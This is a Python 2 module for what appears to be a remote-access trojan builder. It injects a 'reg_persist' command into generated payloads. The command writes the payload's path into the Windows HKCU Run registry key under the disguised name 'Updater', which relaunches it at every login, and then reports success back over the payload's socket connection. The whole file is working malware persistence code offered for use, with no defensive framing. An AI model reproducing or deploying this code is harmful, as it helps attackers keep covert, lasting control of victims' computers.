
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import _winreg')
        config.import_statements.append('from sys import argv')
        config.import_statements.append('from os import getcwd, path')
        config.functions.append('''
def registry_persist(path):
    reg = _winreg.ConnectRegistry(None,_winreg.HKEY_CURRENT_USER)
    key = _winreg.CreateKeyEx(reg,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,_winreg.KEY_WRITE)
    _winreg.SetValueEx(key, 'Updater',0,_winreg.REG_SZ, path)
    _winreg.FlushKey(key)
    _winreg.CloseKey(key)
    _winreg.CloseKey(reg)
    s.sendall('[+]Persistence via registry achieved')''')
        config.logics.append('''
            elif command == "reg_persist":
                registry_persist(path.join(getcwd(),path.abspath(argv[0])))''')
        config.help_menu[
            'reg_persist'] = 'This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path'
    elif option == 'info':
        print '\nName             : Registry Persistence component' \
              '\nOS               : Windows' \
              '\nRequired Modules : _winreg, sys, os' \
              '\nCommands         : reg_persist' \
              '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path'
